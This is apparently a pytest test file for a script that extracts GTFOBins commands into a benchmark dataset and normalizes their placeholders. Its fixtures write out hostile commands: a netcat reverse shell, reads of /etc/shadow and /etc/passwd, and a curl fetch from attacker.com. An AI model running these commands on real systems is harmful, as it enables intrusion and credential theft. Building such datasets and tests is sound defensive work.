"""Tests for GTFOBins extraction script."""

import json
from pathlib import Path

import pytest

from benchmark.extract_gtfobins import (
    EXCLUDED_CATEGORIES,
    INCLUDED_CATEGORIES,
    normalize_command,
    parse_gtfobins_file,
    validate_output,
)


class TestNormalizeCommand:
    """Test placeholder normalization."""

    def test_normalize_lhost_placeholder(self):
        """Normalize $LHOST placeholder."""
        cmd = "nc $LHOST 4444"
        result = normalize_command(cmd)
        assert "10.0.0.1" in result
        assert "$LHOST" not in result

    def test_normalize_lhost_braces(self):
        """Normalize ${LHOST} placeholder."""
        cmd = "nc ${LHOST} 4444"
        result = normalize_command(cmd)
        assert "10.0.0.1" in result
        assert "${LHOST}" not in result

    def test_normalize_rhost_placeholder(self):
        """Normalize $RHOST placeholder."""
        cmd = "curl $RHOST"
        result = normalize_command(cmd)
        assert "10.0.0.1" in result
        assert "$RHOST" not in result

    def test_normalize_port_placeholder(self):
        """Normalize port placeholders."""
        cmd = "nc 10.0.0.1 $LPORT"
        result = normalize_command(cmd)
        assert "4444" in result
        assert "$LPORT" not in result

    def test_normalize_tf_placeholder(self):
        """Normalize $TF temp file placeholder."""
        cmd = "cat $TF"
        result = normalize_command(cmd)
        assert "/tmp/evil" in result
        assert "$TF" not in result

    def test_normalize_attacker_domain(self):
        """Normalize attacker.com domain."""
        cmd = "curl http://attacker.com/file"
        result = normalize_command(cmd)
        assert "10.0.0.1" in result
        assert "attacker.com" not in result

    def test_normalize_input_file_path(self):
        """Normalize /path/to/input-file placeholder."""
        cmd = "cat /path/to/input-file"
        result = normalize_command(cmd)
        assert "/etc/shadow" in result
        assert "/path/to/input-file" not in result

    def test_normalize_output_file_path(self):
        """Normalize /path/to/output-file placeholder."""
        cmd = "echo DATA > /path/to/output-file"
        result = normalize_command(cmd)
        assert "/tmp/evil" in result
        assert "/path/to/output-file" not in result

    def test_preserve_multiline_structure(self):
        """Preserve multiline command structure."""
        cmd = "line1\nline2\nline3"
        result = normalize_command(cmd)
        assert "\n" in result
        assert len(result.split("\n")) == 3

    def test_normalize_path_to_command(self):
        """Normalize /path/to/command placeholder."""
        cmd = "echo /path/to/command | at now"
        result = normalize_command(cmd)
        assert "/path/to/command" not in result
        assert "/tmp/evil.sh" in result

    def test_normalize_path_to_dir(self):
        """Normalize /path/to/dir/ placeholder."""
        cmd = "cp file /path/to/dir/"
        result = normalize_command(cmd)
        assert "/path/to/dir/" not in result
        assert "/tmp/dir/" in result


class TestParseGtfobinsFile:
    """Test GTFOBins YAML file parsing."""

    def test_parse_file_read_category(self, tmp_path):
        """Parse file with file-read category."""
        yaml_content = """
functions:
  file-read:
    - code: cat /etc/shadow
      description: Read files
"""
        test_file = tmp_path / "cat"
        test_file.write_text(yaml_content)

        result = parse_gtfobins_file(test_file)

        assert len(result) == 1
        assert result[0]["binary"] == "cat"
        assert result[0]["category"] == "file-read"
        assert "shadow" in result[0]["command"]

    def test_parse_excludes_shell_category(self, tmp_path):
        """Excluded categories are filtered out."""
        yaml_content = """
functions:
  shell:
    - code: /bin/bash
  file-read:
    - code: cat /etc/passwd
"""
        test_file = tmp_path / "bash"
        test_file.write_text(yaml_content)

        result = parse_gtfobins_file(test_file)

        assert len(result) == 1
        assert result[0]["category"] == "file-read"

    def test_parse_skips_alias_files(self, tmp_path):
        """Alias files (no functions) are skipped."""
        yaml_content = """
alias: bash
"""
        test_file = tmp_path / "sh"
        test_file.write_text(yaml_content)

        result = parse_gtfobins_file(test_file)

        assert len(result) == 0

    def test_parse_handles_empty_file(self, tmp_path):
        """Empty/null YAML returns empty list."""
        test_file = tmp_path / "empty"
        test_file.write_text("")

        result = parse_gtfobins_file(test_file)

        assert result == []

    def test_parse_normalizes_placeholders(self, tmp_path):
        """Placeholders in code are normalized."""
        yaml_content = """
functions:
  reverse-shell:
    - code: nc $LHOST $LPORT -e /bin/sh
"""
        test_file = tmp_path / "nc"
        test_file.write_text(yaml_content)

        result = parse_gtfobins_file(test_file)

        assert len(result) == 1
        assert "$LHOST" not in result[0]["command"]
        assert "10.0.0.1" in result[0]["command"]


class TestValidateOutput:
    """Test output validation."""

    def test_valid_output(self):
        """Valid output passes validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": list(INCLUDED_CATEGORIES),
                "categories_excluded": list(EXCLUDED_CATEGORIES),
                "total_commands": 1,
            },
            "commands": [
                {"command": "cat /etc/shadow", "binary": "cat", "category": "file-read"}
            ],
        }
        assert validate_output(data) is True

    def test_missing_metadata(self):
        """Missing metadata fails validation."""
        data = {"commands": []}
        assert validate_output(data) is False

    def test_missing_commands(self):
        """Missing commands array fails validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": [],
                "categories_excluded": [],
                "total_commands": 0,
            }
        }
        assert validate_output(data) is False

    def test_empty_commands(self):
        """Empty commands array fails validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": [],
                "categories_excluded": [],
                "total_commands": 0,
            },
            "commands": [],
        }
        assert validate_output(data) is False

    def test_excluded_category_fails(self):
        """Command with excluded category fails validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": [],
                "categories_excluded": list(EXCLUDED_CATEGORIES),
                "total_commands": 1,
            },
            "commands": [{"command": "/bin/sh", "binary": "bash", "category": "shell"}],
        }
        assert validate_output(data) is False

    def test_count_mismatch_fails(self):
        """Count mismatch fails validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": list(INCLUDED_CATEGORIES),
                "categories_excluded": list(EXCLUDED_CATEGORIES),
                "total_commands": 5,  # Wrong count
            },
            "commands": [
                {"command": "cat /etc/shadow", "binary": "cat", "category": "file-read"}
            ],
        }
        assert validate_output(data) is False

    def test_duplicate_commands_fails(self):
        """Duplicate commands fail validation."""
        data = {
            "metadata": {
                "source": "GTFOBins",
                "extraction_date": "2026-02-03",
                "categories_included": list(INCLUDED_CATEGORIES),
                "categories_excluded": list(EXCLUDED_CATEGORIES),
                "total_commands": 2,
            },
            "commands": [
                {
                    "command": "cat /etc/shadow",
                    "binary": "cat",
                    "category": "file-read",
                },
                {
                    "command": "cat /etc/shadow",
                    "binary": "cat",
                    "category": "file-read",
                },
            ],
        }
        assert validate_output(data) is False


class TestExtractedOutput:
    """Test the actual extracted output file."""

    @pytest.fixture
    def gtfobins_data(self):
        """Load the extracted GTFOBins data."""
        output_file = (
            Path(__file__).parent.parent
            / "benchmark"
            / "data"
            / "gtfobins_commands.json"
        )
        if not output_file.exists():
            pytest.skip("GTFOBins data file not found - run extract_gtfobins.py first")
        with open(output_file) as f:
            return json.load(f)

    def test_has_metadata(self, gtfobins_data):
        """Output has required metadata fields."""
        assert "metadata" in gtfobins_data
        metadata = gtfobins_data["metadata"]
        assert metadata["source"] == "GTFOBins"
        assert "extraction_date" in metadata
        assert "categories_included" in metadata
        assert "categories_excluded" in metadata
        assert "total_commands" in metadata

    def test_has_commands(self, gtfobins_data):
        """Output has commands array."""
        assert "commands" in gtfobins_data
        assert len(gtfobins_data["commands"]) > 0

    def test_command_schema(self, gtfobins_data):
        """Each command has required fields."""
        for cmd in gtfobins_data["commands"]:
            assert "command" in cmd
            assert "binary" in cmd
            assert "category" in cmd
            assert isinstance(cmd["command"], str)
            assert len(cmd["command"]) > 0

    def test_only_included_categories(self, gtfobins_data):
        """All commands are from included categories only."""
        categories = {cmd["category"] for cmd in gtfobins_data["commands"]}
        for cat in categories:
            assert cat in INCLUDED_CATEGORIES, f"Unexpected category: {cat}"

    def test_no_excluded_categories(self, gtfobins_data):
        """No commands from excluded categories."""
        for cmd in gtfobins_data["commands"]:
            assert cmd["category"] not in EXCLUDED_CATEGORIES, (
                f"Found excluded category: {cmd['category']}"
            )

    def test_no_unnormalized_placeholders(self, gtfobins_data):
        """No commands contain common unnormalized placeholders."""
        placeholder_patterns = ["$LHOST", "$RHOST", "$TF", "$URL", "${LHOST}"]
        for cmd in gtfobins_data["commands"]:
            text = cmd["command"]
            for pattern in placeholder_patterns:
                assert pattern not in text, (
                    f"Found unnormalized placeholder {pattern} in: {text[:50]}"
                )

    def test_count_matches_length(self, gtfobins_data):
        """Total count matches actual array length."""
        assert gtfobins_data["metadata"]["total_commands"] == len(
            gtfobins_data["commands"]
        )

    def test_has_expected_categories(self, gtfobins_data):
        """Output includes commands from expected categories."""
        categories = {cmd["category"] for cmd in gtfobins_data["commands"]}
        # Should have at least file-read and reverse-shell (core GTFOBins categories)
        assert "file-read" in categories
        assert "reverse-shell" in categories

    def test_reasonable_command_count(self, gtfobins_data):
        """Reasonable number of commands extracted."""
        # GTFOBins has many binaries, expect at least 100 commands
        assert len(gtfobins_data["commands"]) >= 100

    def test_no_empty_commands(self, gtfobins_data):
        """No commands are empty strings."""
        for cmd in gtfobins_data["commands"]:
            assert cmd["command"].strip(), f"Empty command found for {cmd['binary']}"

    def test_no_duplicate_commands(self, gtfobins_data):
        """No duplicate commands in output."""
        command_texts = [cmd["command"] for cmd in gtfobins_data["commands"]]
        assert len(command_texts) == len(set(command_texts)), "Found duplicate commands"

    def test_no_path_to_placeholders(self, gtfobins_data):
        """No commands contain /path/to/ placeholder patterns."""
        for cmd in gtfobins_data["commands"]:
            text = cmd["command"]
            assert "/path/to/" not in text, (
                f"Found /path/to/ placeholder in: {text[:60]}"
            )
